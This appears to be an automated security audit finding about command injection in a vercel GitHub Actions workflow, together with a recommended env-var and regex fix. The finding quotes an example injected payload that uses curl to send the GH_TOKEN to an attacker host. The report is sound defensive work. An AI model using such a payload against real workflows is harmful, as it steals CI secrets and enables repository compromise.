# [HIGH] Bash command injection via client_payload.git.sha interpolation

**File:** [`.github/workflows/comment-cli-tarball.yml`](https://github.com/vercel/vercel/blob/melkey/bun-working-branch/blob/melkey/.github/workflows/comment-cli-tarball.yml#L25-L26) (lines 25, 26)
**Project:** vercel
**Severity:** HIGH  •  **Confidence:** high  •  **Slug:** `other-script-injection-bash`

## Owners

**Suggested assignee:** `cody.wong@vercel.com` _(via last-committer)_

## Finding

Line 25 directly interpolates `${{ github.event.client_payload.git.sha }}` into a `run:` bash block: `SHA="${{ github.event.client_payload.git.sha }}"`. The `${{ }}` substitution happens at workflow-pre-execution time, before bash sees the value. An attacker who can send a `repository_dispatch` event of type `vercel.project.QmcQ2AGNAWeR6ZJCWAhqhbixxvWbgvsR2LMT4fzmTfY9SK.deployment.ready` (the project ID is now publicly known via this workflow file) with a payload like `{"git":{"sha":"abc\";curl https://attacker.example/$GH_TOKEN;\""}}` would result in bash executing the curl command. The step has `GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}` set, so the token is leakable in-process. While `repository_dispatch` requires authentication with a token having repo scope, the field `client_payload.git.sha` is fully attacker-controllable in JSON — there is no Git-side validation that a 40-char hex string is what arrives. The step then uses `gh api repos/${{ github.repository }}/commits/${SHA}/pulls`, but the injection has already executed at the SHA assignment.

## Recommendation

Pass the value via an env var instead: `env: { CLIENT_SHA: ${{ github.event.client_payload.git.sha }} }` and reference `"$CLIENT_SHA"` in the script. Additionally, validate the SHA matches `^[0-9a-fA-F]{40}$` before using it.

## Recent committers (`git log`)

- Cody Wong <cody.wong@vercel.com> (2026-04-23)
- Michael J. Sullivan <sully@msully.net> (2026-03-02)
- Ricardo Gonzalez <30984749+ricardo-agz@users.noreply.github.com> (2026-02-24)
- Elvis Pranskevichus <elvis@vercel.com> (2026-02-13)
- Marcos Grappeggia <marcosgrappeggia@gmail.com> (2026-02-12)
